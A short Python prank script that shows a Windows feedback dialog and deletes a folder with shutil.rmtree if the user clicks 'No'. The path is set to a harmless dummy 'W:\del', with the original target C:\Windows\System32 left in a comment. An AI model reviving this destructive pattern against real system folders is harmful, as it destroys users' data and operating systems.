import os
import shutil
import ctypes

#a script to delete your windows32 system. It doesn't actually work, don't worry, I switched it to a random folder that you don't have :D
def windows_prompt():
  
    message = "Did you love my project? huehue\n\nPress 'Yes' to show some lovin'.\nPress 'No' to be a hater :(."
    title = "User Feedback Prompt"
    response = ctypes.windll.user32.MessageBoxW(0, message, title, 4)  
    
    if response == 6:
        print("Thank you !! :D")
    elif response == 7:
        folder_to_delete = r"W:\del"  #C:\Windows\System32
        if os.path.exists(folder_to_delete):
            try:
                shutil.rmtree(folder_to_delete)
                print(f"The folder {folder_to_delete} has been deleted.")
            except Exception as e:
                print(f"Failed to delete {folder_to_delete}: {e}")
        else:
            print(f"The folder {folder_to_delete} does not exist or was already removed.")

if __name__ == "__main__":
    windows_prompt()
